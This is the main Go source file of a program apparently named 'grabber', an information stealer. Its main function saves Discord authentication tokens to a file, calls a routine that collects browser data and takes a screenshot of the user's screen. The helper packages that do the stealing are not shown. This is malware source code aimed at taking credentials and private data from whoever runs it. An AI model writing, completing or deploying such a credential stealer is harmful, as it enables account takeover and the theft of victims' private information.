// main.go
package main

import (
	"fmt"
	"os"
	"time"

	"example.com/grabber/browsers"
	"example.com/grabber/discord"
	"example.com/grabber/screenshot"
	_ "github.com/mattn/go-sqlite3"
)

func main() {
	startTime := time.Now()
	os.WriteFile("discord.json", []byte(discord.GetTokens()), 0644)
	browsers.GetBrowserData()
	screenshot.TakeScreenshot()
	fmt.Println("Time elapsed: ", time.Since(startTime))
	os.Exit(0)
}
